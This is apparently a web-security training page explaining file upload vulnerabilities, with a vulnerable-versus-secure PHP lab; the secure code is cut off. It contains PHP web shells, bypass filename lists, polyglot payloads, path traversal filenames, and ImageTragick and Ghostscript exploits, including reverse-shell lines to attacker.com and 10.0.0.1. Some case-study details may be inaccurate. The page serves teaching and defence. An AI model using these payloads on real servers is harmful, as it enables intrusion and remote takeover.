<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
session_start();
$isLoggedIn = isset($_SESSION['user_id']);
$isStrictAuth = true;

?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description"
    content="Master File Upload vulnerabilities - Understanding unrestricted file upload attacks, web shell execution, and implementing robust validation defenses. Complete cybersecurity training module.">
  <title>File Upload Vulnerabilities - Complete Guide | DarkHunter</title>

  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="/DarkHunter/learningBugs/css/file-upload-info.css?v=1.1">

</head>

<body>
  <div class="grid-bg"></div>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Public/login-modal.php'; ?>
  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

  <div class="app-container">
    <a href="/DarkHunter/Public/Learning.php" class="modern-back-btn">
      <i>←</i>
      <span>Back to Modules</span>
    </a>

    <aside class="sidebar">
      <div class="sidebar-header">
        <div class="sidebar-brand">
          👾 <span>DARK</span>HUNTER
        </div>
      </div>

      <div class="nav-section">
        <div class="nav-title">Navigation</div>
        <ul class="nav-links">
          <li><a href="#overview" class="active"><i>📚</i> Overview</a></li>
          <li><a href="#mechanism"><i>⚙️</i> How It Works</a></li>
          <li><a href="#exploitation"><i>🎯</i> Exploitation Steps</a></li>
          <li><a href="#impact"><i>💥</i> Real-World Impact</a></li>
          <li><a href="#labs"><i>💻</i> Code Labs</a></li>
          <li><a href="#bypass"><i>🚧</i> Bypass Techniques</a></li>
          <li><a href="#mitigation"><i>🛡️</i> Prevention</a></li>
        </ul>
      </div>

      <div class="nav-section">
        <div class="nav-title">Related Modules</div>
        <ul class="nav-links">
          <li><a href="/DarkHunter/learningBugs/xss-info.php"><i>💻</i> XSS</a></li>
          <li><a href="/DarkHunter/learningBugs/sqli-info.php"><i>🗃️</i> SQL Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/csrf-info.php"><i>🧬</i> CSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/idor-info.php"><i>🆔</i> IDOR</a></li>
          <li><a href="/DarkHunter/learningBugs/jwt-info.php"><i>🎫</i> JWT</a></li>
          <li><a href="/DarkHunter/learningBugs/ssti-info.php"><i>🧪</i> SSTI</a></li>
          <li><a href="/DarkHunter/learningBugs/cors-info.php"><i>🔗</i> CORS</a></li>
          <li><a href="/DarkHunter/learningBugs/ssrf-info.php"><i>🌐</i> SSRF</a></li>
          <li><a href="/DarkHunter/learningBugs/cache-poisoning-info.php"><i>🧃</i> Cache Poisoning</a></li>
          <li><a href="/DarkHunter/learningBugs/host-header-info.php"><i>🖥️</i> Host Header Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/oauth-info.php"><i>🔑</i> OAUTH</a></li>
          <li><a href="/DarkHunter/learningBugs/http-smuggling-info.php"><i>📦</i> HTTP Smuggling</a></li>
          <li><a href="/DarkHunter/learningBugs/html-injection-info.php"><i>📝</i> HTML Injection</a></li>
          <li><a href="/DarkHunter/learningBugs/lfi-info.php"><i>📁</i> LFI</a></li>
          <li><a href="/DarkHunter/learningBugs/open-redirect-info.php"><i>↪️</i> Open Redirect</a></li>
          <li><a href="/DarkHunter/learningBugs/rce-info.php"><i>💻</i> RCE</a></li>
          <li><a href="/DarkHunter/learningBugs/race-condition-info.php"><i>⚡</i> Race Condition</a></li>
        </ul>
      </div>
    </aside>

    <main class="main-content">
      <div class="page-header">
        <h1 class="page-title">File Upload Vulnerabilities</h1>
        <p class="page-subtitle">
          Master File Upload vulnerabilities - Learn how unrestricted file uploads lead to Remote Code Execution (RCE),
          web shell deployment, and complete server compromise. Understand validation bypass techniques and
          defense-in-depth strategies.
        </p>
      </div>

      <div class="content-card">
        <div class="toc">
          <div class="toc-title">📋 Table of Contents</div>
          <ul class="toc-list">
            <li><a href="#overview">1. What is File Upload Vulnerability?</a></li>
            <li><a href="#mechanism">2. Technical Mechanism</a></li>
            <li><a href="#exploitation">3. Exploitation Steps</a></li>
            <li><a href="#impact">4. Real-World Impact</a></li>
            <li><a href="#labs">5. Code Labs: Vulnerable vs Secure</a></li>
            <li><a href="#bypass">6. Bypass Techniques</a></li>
            <li><a href="#mitigation">7. Prevention Checklist</a></li>
          </ul>
        </div>
      </div>

      <div id="overview" class="content-card">
        <h2 class="card-title"><i>📚</i> What is File Upload Vulnerability?</h2>

        <div class="highlight-box">
          <strong>Definition:</strong> File Upload Vulnerability occurs when a web application allows users to upload
          files
          without proper validation of file type, content, or extension. This enables attackers to upload malicious
          files
          such as web shells, executable scripts, or malware that can be executed on the server, leading to Remote Code
          Execution (RCE), data breaches, or complete system compromise.
        </div>

        <p class="text-content">
          File upload functionality is common in modern web applications for profile pictures, document uploads,
          attachments, and content management. However, when implemented without rigorous security controls, it becomes
          one of the most dangerous attack vectors. Unlike other vulnerabilities that might leak data, file upload
          vulnerabilities often provide direct code execution capabilities on the target server.
        </p>

        <div class="danger-box">
          <strong>⚠️ Critical Impact:</strong> Successful file upload attacks can result in Remote Code Execution (RCE),
          web shell deployment, server takeover, data exfiltration, privilege escalation, lateral movement within the
          network, and defacement. In cloud environments, this can lead to container escape and cluster compromise.
        </div>

        <h3 class="subsection-title">CVSS Severity Assessment</h3>
        <div class="highlight-box">
          <strong>CVSS Score Range: 8.0 - 10.0 (High to Critical)</strong>
          <ul style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Attack Vector:</strong> Network (remotely exploitable)</li>
            <li><strong>Attack Complexity:</strong> Low to Medium (depends on validation strength)</li>
            <li><strong>Privileges Required:</strong> Low (often any authenticated user)</li>
            <li><strong>User Interaction:</strong> None (direct upload exploitation)</li>
            <li><strong>Scope:</strong> Changed (can affect underlying server and network)</li>
            <li><strong>Impact:</strong> Critical on Confidentiality, Integrity, and Availability</li>
          </ul>
        </div>

        <h3 class="subsection-title">Types of File Upload Vulnerabilities</h3>
        <p class="text-content">
          File upload vulnerabilities manifest in different forms based on the validation weaknesses:
        </p>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse; margin-top: 1rem;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Type</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Description</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Impact</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Unrestricted Upload</td>
              <td style="padding: 0.75rem;">No validation on file type or extension</td>
              <td style="padding: 0.75rem;">Direct RCE via web shell</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Extension Bypass</td>
              <td style="padding: 0.75rem;">Weak blacklist/whitelist validation</td>
              <td style="padding: 0.75rem;">Executable file upload</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">MIME-Type Spoofing</td>
              <td style="padding: 0.75rem;">Client-side or weak server-side MIME validation</td>
              <td style="padding: 0.75rem;">Bypass content-type checks</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Magic Bytes Bypass</td>
              <td style="padding: 0.75rem;">File signature validation bypass</td>
              <td style="padding: 0.75rem;">Polyglot file upload</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Path Traversal</td>
              <td style="padding: 0.75rem;">Directory traversal in filename</td>
              <td style="padding: 0.75rem;">Overwrite critical files</td>
            </tr>
          </table>
        </div>

        <h3 class="subsection-title">Dangerous File Types</h3>
        <div class="file-type-grid">
          <div class="file-type-card danger">
            <div class="file-icon">🐘</div>
            <div class="file-name">.php</div>
            <div class="file-desc">PHP Web Shell</div>
          </div>
          <div class="file-type-card danger">
            <div class="file-icon">🐍</div>
            <div class="file-name">.jsp</div>
            <div class="file-desc">Java Server Page</div>
          </div>
          <div class="file-type-card danger">
            <div class="file-icon">🎯</div>
            <div class="file-name">.asp/.aspx</div>
            <div class="file-desc">Active Server Pages</div>
          </div>
          <div class="file-type-card danger">
            <div class="file-icon">📜</div>
            <div class="file-name">.sh/.bash</div>
            <div class="file-desc">Shell Scripts</div>
          </div>
          <div class="file-type-card danger">
            <div class="file-icon">⚡</div>
            <div class="file-name">.py</div>
            <div class="file-desc">Python Scripts</div>
          </div>
          <div class="file-type-card danger">
            <div class="file-icon">🔧</div>
            <div class="file-name">.htaccess</div>
            <div class="file-desc">Apache Config</div>
          </div>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">📊 File Upload Attack Architecture</div>
          <div class="diagram-placeholder">
            <i>🖼️</i><br>
            [Insert Diagram: Attacker → Upload Form → Malicious File → Server Execution → Shell Access]
          </div>
        </div>
      </div>

      <div id="mechanism" class="content-card">
        <h2 class="card-title"><i>⚙️</i> How File Upload Vulnerabilities Work</h2>

        <h3 class="subsection-title">The HTTP Multipart Protocol</h3>
        <p class="text-content">
          File uploads use HTTP multipart/form-data encoding. Understanding this protocol is crucial for both
          exploitation and defense.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">HTTP Multipart Request Structure</span></div>
          <pre><code><span class="code-tag">POST</span> <span class="code-attr">/upload.php</span> <span class="code-tag">HTTP/1.1</span>
<span class="code-attr">Host</span>: <span class="code-string">target.com</span>
<span class="code-attr">Content-Type</span>: <span class="code-string">multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk</span>
<span class="code-attr">Content-Length</span>: <span class="code-string">345</span>

------WebKitFormBoundary7MA4YWxk
<span class="code-tag">Content-Disposition</span>: <span class="code-attr">form-data; name="file"; filename="shell.php"</span>
<span class="code-tag">Content-Type</span>: <span class="code-attr">application/x-php</span>

<span class="code-string">&lt;?php system($_GET['cmd']); ?&gt;</span>
------WebKitFormBoundary7MA4YWxk
<span class="code-tag">Content-Disposition</span>: <span class="code-attr">form-data; name="submit"</span>

<span class="code-string">Upload</span>
------WebKitFormBoundary7MA4YWxk--</code></pre>
        </div>

        <h3 class="subsection-title">Server-Side Processing Flow</h3>
        <p class="text-content">
          When a file is uploaded, the server processes it through several stages, each presenting potential
          vulnerabilities:
        </p>

        <div class="highlight-box">
          <strong>Processing Pipeline:</strong>
          <ol style="margin-left: 2rem; margin-top: 0.5rem;">
            <li><strong>Request Parsing:</strong> Server parses multipart data and extracts file metadata</li>
            <li><strong>Validation Layer 1:</strong> Client-side JavaScript validation (easily bypassed)</li>
            <li><strong>Validation Layer 2:</strong> Server-side extension/MIME-type checking</li>
            <li><strong>Validation Layer 3:</strong> File content/magic bytes verification</li>
            <li><strong>Storage:</strong> File written to web-accessible directory</li>
            <li><strong>Execution:</strong> Web server serves file (static content or parsed code)</li>
          </ol>
        </div>

        <h3 class="subsection-title">Common Vulnerable Patterns</h3>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Common Vulnerable Entry Points</span></div>
          <pre><code><span class="code-comment">-- Profile picture upload</span>
<span class="code-string">POST /api/user/avatar</span>
<span class="code-string">Content-Type: multipart/form-data</span>

<span class="code-comment">-- Document upload in CMS</span>
<span class="code-string">POST /admin/upload-document</span>

<span class="code-comment">-- File attachment in messaging</span>
<span class="code-string">POST /api/messages/attachments</span>

<span class="code-comment">-- Import functionality</span>
<span class="code-string">POST /admin/import-users</span>
<span class="code-string">Content-Type: multipart/form-data</span>

<span class="code-comment">-- Image upload with resize</span>
<span class="code-string">POST /api/images/upload</span>
<span class="code-comment">-- ImageMagick exploitation possible</span></code></pre>
        </div>

        <h3 class="subsection-title">Web Shell Execution Context</h3>
        <p class="text-content">
          Once uploaded, the file's execution depends on server configuration, file location, and extension handling.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Apache .htaccess Override</span></div>
          <pre><code><span class="code-comment">-- Upload .htaccess to enable PHP execution in any directory</span>
<span class="code-attr">AddType</span> <span class="code-string">application/x-httpd-php .jpg .png .gif</span>
<span class="code-attr">php_flag</span> <span class="code-string">engine on</span>

<span class="code-comment">-- Or execute arbitrary files as PHP</span>
<span class="code-tag">&lt;FilesMatch</span> <span class="code-string">"^shell$"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">SetHandler</span> <span class="code-attr">application/x-httpd-php</span>
<span class="code-tag">&lt;/FilesMatch&gt;</span>

<span class="code-comment">-- Nginx misconfiguration exploitation</span>
<span class="code-comment">-- If nginx.conf has: location ~ \.php$ { ... }</span>
<span class="code-comment">-- Upload: /uploads/image.jpg%00.php (null byte in older PHP versions)</span></code></pre>
        </div>

        <div class="attack-flow">
          <div class="flow-step">
            <div class="flow-icon attack">📁</div>
            <div class="flow-label">Craft Payload</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Create web shell or malicious
              file</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">🎭</div>
            <div class="flow-label">Bypass Validation</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Extension/MIME spoofing</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon victim">⬆️</div>
            <div class="flow-label">Upload File</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Multipart form submission</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon attack">🔗</div>
            <div class="flow-label">Access URL</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">Navigate to uploaded file</p>
          </div>
          <div class="flow-step">
            <div class="flow-icon server">💀</div>
            <div class="flow-label">Execute Code</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.5rem;">RCE achieved</p>
          </div>
        </div>
      </div>

      <div id="exploitation" class="content-card">
        <h2 class="card-title"><i>🎯</i> Exploitation Steps: Finding and Exploiting File Upload</h2>

        <h3 class="subsection-title">Step 1: Identify Upload Functionality</h3>
        <p class="text-content">
          Map all file upload endpoints and analyze the upload form structure and client-side validation.
        </p>

        <div class="highlight-box">
          <strong>Reconnaissance Checklist:</strong>
          <ul style="margin-left: 2rem;">
            <li>Locate all forms with <code>enctype="multipart/form-data"</code></li>
            <li>Check API endpoints accepting POST/PUT with file content</li>
            <li>Identify accepted file types from UI hints or error messages</li>
            <li>Analyze JavaScript validation logic (easily bypassed)</li>
            <li>Check for file size limits and upload directories</li>
          </ul>
        </div>

        <h3 class="subsection-title">Step 2: Test Basic Upload</h3>
        <p class="text-content">
          Attempt to upload a simple web shell to test for unrestricted upload vulnerabilities.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Basic PHP Web Shell</span></div>
          <pre><code><span class="code-comment">-- Simple command execution shell</span>
<span class="code-keyword">&lt;?php</span> <span class="code-function">system</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'cmd'</span>]); <span class="code-keyword">?&gt;</span>

<span class="code-comment">-- Advanced web shell (WSO)</span>
<span class="code-keyword">&lt;?php</span>
<span class="code-keyword">if</span>(<span class="code-function">isset</span>(<span class="code-keyword">$_REQUEST</span>[<span class="code-string">'cmd'</span>])){
    <span class="code-keyword">echo</span> <span class="code-string">"&lt;pre&gt;"</span>;
    <span class="code-keyword">$cmd</span> = (<span class="code-keyword">$_REQUEST</span>[<span class="code-string">'cmd'</span>]);
    <span class="code-function">system</span>(<span class="code-keyword">$cmd</span>);
    <span class="code-keyword">echo</span> <span class="code-string">"&lt;/pre&gt;"</span>;
    <span class="code-keyword">die</span>;
}
<span class="code-keyword">?&gt;</span>

<span class="code-comment">-- One-liner for quick testing</span>
<span class="code-keyword">&lt;?php</span> <span class="code-function">eval</span>(<span class="code-keyword">$_POST</span>[<span class="code-string">'x'</span>]); <span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 3: Analyze Validation Response</h3>
        <p class="text-content">
          Use Burp Suite to intercept and modify upload requests. Test different validation bypass techniques.
        </p>

        <div class="code-block">
          <div class="code-header"><span class="code-label">Burp Suite Testing Methodology</span></div>
          <pre><code><span class="code-comment">-- Intercept upload request in Burp Proxy</span>
<span class="code-comment">-- Send to Repeater for iterative testing</span>

<span class="code-comment">-- Test 1: Extension variation</span>
<span class="code-string">filename="shell.php"</span>
<span class="code-string">filename="shell.php3"</span>
<span class="code-string">filename="shell.phtml"</span>
<span class="code-string">filename="shell.php%00.jpg"</span>  <span class="code-comment">-- Null byte (PHP < 5.3.4)</span>

<span class="code-comment">-- Test 2: Case sensitivity</span>
<span class="code-string">filename="shell.PHP"</span>
<span class="code-string">filename="shell.PhP"</span>

<span class="code-comment">-- Test 3: Double extension</span>
<span class="code-string">filename="shell.jpg.php"</span>
<span class="code-string">filename="shell.php.jpg"</span>

<span class="code-comment">-- Test 4: Special characters</span>
<span class="code-string">filename="shell.php."</span>
<span class="code-string">filename="shell.php..."</span>
<span class="code-string">filename="shell.php%20"</span>
<span class="code-string">filename="shell.php::$DATA"</span>  <span class="code-comment">-- Windows ADS</span>

<span class="code-comment">-- Test 5: MIME type spoofing</span>
<span class="code-string">Content-Type: image/jpeg</span>  <span class="code-comment">-- Change from application/x-php</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 4: Content Validation Bypass</h3>
        <p class="text-content">
          Bypass magic bytes and content-type validation using polyglot files.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Polyglot File Creation</span></div>
          <pre><code><span class="code-comment">-- GIF header + PHP payload (GIF89a;)</span>
<span class="code-string">GIF89a;</span><span class="code-keyword">&lt;?php</span> <span class="code-function">system</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'cmd'</span>]); <span class="code-keyword">?&gt;</span>

<span class="code-comment">-- PNG header + PHP (use exiftool or hex editor)</span>
<span class="code-string">‰PNG</span>
<span class="code-keyword">&lt;?php</span> <span class="code-function">system</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'cmd'</span>]); <span class="code-keyword">?&gt;</span>

<span class="code-comment">-- JPEG with embedded PHP (using exiftool)</span>
<span class="code-string">exiftool -Comment='&lt;?php system($_GET[cmd]); ?&gt;' shell.jpg</span>

<span class="code-comment">-- Magic bytes reference:</span>
<span class="code-comment">-- JPEG: FF D8 FF E0</span>
<span class="code-comment">-- PNG: 89 50 4E 47 0D 0A 1A 0A</span>
<span class="code-comment">-- GIF: GIF89a (47 49 46 38 39 61)</span>
<span class="code-comment">-- PDF: %PDF-1.4</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 5: Path Traversal in Upload</h3>
        <p class="text-content">
          Exploit directory traversal to write files outside the upload directory or overwrite critical files.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Path Traversal Payloads</span></div>
          <pre><code><span class="code-comment">-- Upload to parent directory</span>
<span class="code-string">filename="../../../var/www/html/shell.php"</span>
<span class="code-string">filename="..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"</span>

<span class="code-comment">-- Overwrite .htaccess</span>
<span class="code-string">filename="../../../var/www/html/.htaccess"</span>
<span class="code-attr">Content</span>: <span class="code-string">AddType application/x-httpd-php .jpg</span>

<span class="code-comment">-- Overwrite configuration files</span>
<span class="code-string">filename="../../../config.php"</span>
<span class="code-string">filename="../../../.env"</span>

<span class="code-comment">-- Null byte truncation (legacy PHP)</span>
<span class="code-string">filename="shell.php%00.jpg"</span></code></pre>
        </div>

        <h3 class="subsection-title">Step 6: Advanced Exploitation</h3>

        <h4>ImageMagick / Ghostscript Exploits</h4>
        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">ImageTragick (CVE-2016-3714)</span></div>
          <pre><code><span class="code-comment">-- Upload malicious MVG (Magick Vector Graphics) file</span>
<span class="code-string">push graphic-context</span>
<span class="code-string">viewbox 0 0 640 480</span>
<span class="code-string">fill 'url(https://attacker.com/shell.jpg"|bash -i >& /dev/tcp/attacker.com/4444 0>&1")'</span>
<span class="code-string">pop graphic-context</span>

<span class="code-comment">-- Or via filename injection</span>
<span class="code-string">filename='|bash -i >& /dev/tcp/10.0.0.1/4444 0>&1|.jpg'</span>

<span class="code-comment">-- Ghostscript RCE (CVE-2018-16509)</span>
<span class="code-string">%!PS</span>
<span class="code-string">userdict /setpagedevice undef</span>
<span class="code-string">save</span>
<span class="code-string">legal</span>
<span class="code-string">{ null restore } stopped { pop } if</span>
<span class="code-string">{ legal } stopped { pop } if</span>
<span class="code-string">restore</span>
<span class="code-string">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span></code></pre>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: File Upload to RCE Exploitation</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Step-by-step exploitation from upload form to web shell execution]
          </div>
        </div>
      </div>

      <div id="impact" class="content-card">
        <h2 class="card-title"><i>💥</i> Real-World Impact: Notorious File Upload Breaches</h2>

        <h3 class="subsection-title">Case Study 1: Facebook File Upload RCE (2016)</h3>
        <p class="text-content">
          Security researcher Orange Tsai discovered a critical file upload vulnerability in Facebook's advertising
          platform. By exploiting a double extension vulnerability in the image upload feature, he achieved remote
          code execution on Facebook's production servers.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Full server compromise, ability to read internal configuration files, access to
          production databases. Facebook paid $10,000 bounty. The vulnerability existed in the parsing of
          <code>filename="shell.jpg.php"</code> where the system only checked the final extension.
        </div>

        <h3 class="subsection-title">Case Study 2: WordPress TimThumb Plugin (2011)</h3>
        <p class="text-content">
          The TimThumb image resizing plugin used by millions of WordPress sites contained a file upload vulnerability.
          The plugin allowed remote image fetching and caching but failed to validate file extensions properly,
          allowing attackers to upload PHP shells disguised as remote images.
        </p>
        <div class="warning-box">
          <strong>Attack Chain:</strong> Remote URL parameter → Fetch malicious "image" → Save as .php in cache
          directory → Execute web shell → Mass website compromises. Over 1.2 million sites affected.
        </div>

        <h3 class="subsection-title">Case Study 3: Apache Struts2 Jakarta Plugin (2017)</h3>
        <p class="text-content">
          While primarily an RCE via OGNL injection, the vulnerability was often exploited via file upload mechanisms
          in Struts2 applications. Attackers could upload malicious content that triggered the Jakarta Multipart
          parser vulnerability (CVE-2017-5638).
        </p>
        <div class="highlight-box">
          <strong>Impact:</strong> Equifax data breach (143 million records), numerous government and corporate
          compromises. Demonstrated how file upload components can chain with parser vulnerabilities for massive impact.
        </div>

        <h3 class="subsection-title">Case Study 4: vBulletin RCE via File Upload (2019)</h3>
        <p class="text-content">
          vBulletin forum software had a critical file upload vulnerability in its avatar upload feature. The
          application used a flawed extension blacklist that could be bypassed using the <code>.php.suspected</code>
          extension, which Apache still executed as PHP.
        </p>
        <div class="danger-box">
          <strong>Impact:</strong> Thousands of forums compromised, database dumps, defacement campaigns. The
          vulnerability was actively exploited in the wild within hours of disclosure.
        </div>

        <h3 class="subsection-title">Common Attack Scenarios by Industry</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Industry</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Upload Scenario</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--danger);">Potential Damage</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Social Media</td>
              <td style="padding: 0.75rem;">Profile pictures, media uploads</td>
              <td style="padding: 0.75rem;">Server takeover, data theft</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">E-Commerce</td>
              <td style="padding: 0.75rem;">Product images, import files</td>
              <td style="padding: 0.75rem;">Payment data theft, defacement</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Healthcare</td>
              <td style="padding: 0.75rem;">Medical images, patient documents</td>
              <td style="padding: 0.75rem;">PHI exposure, HIPAA violations</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Finance</td>
              <td style="padding: 0.75rem;">Document verification, statements</td>
              <td style="padding: 0.75rem;">Financial fraud, PII theft</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">CMS/Blogging</td>
              <td style="padding: 0.75rem;">Media library, theme uploads</td>
              <td style="padding: 0.75rem;">Mass defacement, botnet recruitment</td>
            </tr>
          </table>
        </div>
      </div>

      <div id="labs" class="content-card">
        <h2 class="card-title"><i>💻</i> Code Labs: Vulnerable vs Secure Implementation</h2>

        <div class="warning-box">
          <strong>🎯 Lab Objective:</strong> Understand how improper file validation enables RCE, then implement
          extension whitelist, MIME validation, content verification, and secure storage practices.
        </div>

        <h3 class="subsection-title">Lab 1: Basic Unrestricted Upload</h3>
        <p class="text-content">
          <strong>Vulnerability:</strong> No validation of file type, extension, or content.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">❌ Vulnerable PHP Code</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Vulnerable: No validation whatsoever</span>
<span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'REQUEST_METHOD'</span>] === <span class="code-string">'POST'</span>) {
    <span class="code-keyword">$uploadDir</span> = <span class="code-string">'uploads/'</span>;
    <span class="code-keyword">$uploadFile</span> = <span class="code-keyword">$uploadDir</span> . <span class="code-function">basename</span>(<span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'name'</span>]);
    
    <span class="code-comment">// DANGEROUS: Direct move without checks</span>
    <span class="code-keyword">if</span> (<span class="code-function">move_uploaded_file</span>(<span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'tmp_name'</span>], <span class="code-keyword">$uploadFile</span>)) {
        <span class="code-keyword">echo</span> <span class="code-string">"File uploaded successfully: "</span> . <span class="code-keyword">$uploadFile</span>;
        <span class="code-keyword">echo</span> <span class="code-string">"&lt;br&gt;Access at: &lt;a href='"</span> . <span class="code-keyword">$uploadFile</span> . <span class="code-string">"'&gt;Click here&lt;/a&gt;"</span>;
    } <span class="code-keyword">else</span> {
        <span class="code-keyword">echo</span> <span class="code-string">"Upload failed!"</span>;
    }
}
<span class="code-keyword">?&gt;</span>

<span class="code-tag">&lt;form</span> <span class="code-attr">method</span>=<span class="code-string">"POST"</span> <span class="code-attr">enctype</span>=<span class="code-string">"multipart/form-data"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"file"</span> <span class="code-attr">name</span>=<span class="code-string">"file"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;button</span> <span class="code-attr">type</span>=<span class="code-string">"submit"</span><span class="code-tag">&gt;</span>Upload<span class="code-tag">&lt;/button&gt;</span>
<span class="code-tag">&lt;/form&gt;</span></code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">✅ Secure Implementation</span>
            <div class="code-actions">
              <button class="code-btn" onclick="copyCode(this)">📋 Copy</button>
            </div>
          </div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-keyword">class</span> <span class="code-function">SecureFileUploader</span> {
    <span class="code-keyword">private</span> <span class="code-keyword">$allowedExtensions</span> = [<span class="code-string">'jpg'</span>, <span class="code-string">'jpeg'</span>, <span class="code-string">'png'</span>, <span class="code-string">'gif'</span>];
    <span class="code-keyword">private</span> <span class="code-keyword">$maxFileSize</span> = <span class="code-keyword">5242880</span>; <span class="code-comment">// 5MB</span>
    <span class="code-keyword">private</span> <span class="code-keyword">$uploadDir</span>;
    <span class="code-keyword">private</span> <span class="code-keyword">$errors</span> = [];
    
    <span class="code-keyword">public function</span> <span class="code-function">__construct</span>() {
        <span class="code-keyword">$this</span>-><span class="code-attr">uploadDir</span> = <span class="code-function">dirname</span>(<span class="code-keyword">__DIR__</span>) . <span class="code-string">'/uploads/'</span>;
        <span class="code-keyword">$this</span>-><span class="code-function">ensureDirectoryExists</span>();
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">upload</span>(<span class="code-keyword">$file</span>) {
        <span class="code-comment">// Validate upload errors</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">$file</span>[<span class="code-string">'error'</span>] !== <span class="code-function">UPLOAD_ERR_OK</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Upload error code: "</span> . <span class="code-keyword">$file</span>[<span class="code-string">'error'</span>]);
        }
        
        <span class="code-comment">// Validate file size</span>
        <span class="code-keyword">if</span> (<span class="code-keyword">$file</span>[<span class="code-string">'size'</span>] > <span class="code-keyword">$this</span>-><span class="code-attr">maxFileSize</span>) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"File too large"</span>);
        }
        
        <span class="code-comment">// Get and validate extension</span>
        <span class="code-keyword">$originalName</span> = <span class="code-keyword">$file</span>[<span class="code-string">'name'</span>];
        <span class="code-keyword">$extension</span> = <span class="code-function">strtolower</span>(<span class="code-function">pathinfo</span>(<span class="code-keyword">$originalName</span>, <span class="code-function">PATHINFO_EXTENSION</span>));
        
        <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$extension</span>, <span class="code-keyword">$this</span>-><span class="code-attr">allowedExtensions</span>, <span class="code-keyword">true</span>)) {
